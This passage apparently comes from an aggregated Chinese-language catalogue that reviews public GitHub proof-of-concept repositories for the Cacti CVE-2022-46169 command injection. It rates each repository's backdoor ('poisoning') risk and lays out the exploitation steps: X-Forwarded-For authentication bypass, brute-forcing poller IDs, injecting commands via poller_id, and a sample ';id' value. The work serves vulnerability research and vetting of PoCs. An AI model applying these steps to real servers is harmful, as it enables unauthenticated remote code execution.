**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

**来源**: [CVE-2022-46169-antisecc_CVE-2022-46169.md](../2022/CVE-2022-46169-antisecc_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在`poller_item`记录，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (2)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中。攻击者可以通过设置 `X-Forwarded-For` HTTP 头绕过身份验证，然后利用 `polldata` 操作，将恶意命令注入到 `poller_id` 参数中，导致服务器执行任意命令。  

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用的**有效性高**。漏洞库和搜索引擎结果都确认了该漏洞的存在和严重性，并且已经有公开的漏洞利用代码可用。提供的 Python 脚本 `CVE-2022-46169.py` 实现了漏洞利用过程，包括绕过身份验证和注入命令。  

**投毒风险分析：**

对提供的 Python 脚本进行分析，该脚本的主要功能是利用 CVE-2022-46169 漏洞，不存在明显的恶意代码或后门。但是，任何利用代码都存在被修改的风险，攻击者可能会在代码中添加恶意功能。考虑到代码量较少，逻辑清晰，用户可以容易地进行审查，因此，**投毒风险较低，估计为5%**。这个风险主要来自使用者没有进行代码审计就直接使用，例如添加反弹shell等恶意操作。

**利用方式：**

1.  **身份验证绕过：** 攻击者发送带有 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，伪造客户端 IP 地址，绕过身份验证。
2.  **命令注入：** 攻击者构造包含恶意命令的 `poller_id` 参数，通过 `polldata` 操作传递给 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器在处理 `polldata` 操作时，会将 `poller_id` 参数中的恶意命令注入到 `proc_open` 函数中，导致服务器执行任意命令。

**POC利用方式详细过程:**

1.  运行 `CVE-2022-46169.py` 脚本，指定目标 Cacti 实例的 URL 和要执行的命令。
2.  脚本会遍历一系列 `host_id`，并为每个 `host_id` 构建一个包含恶意 `poller_id` 参数的 HTTP GET 请求。
3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

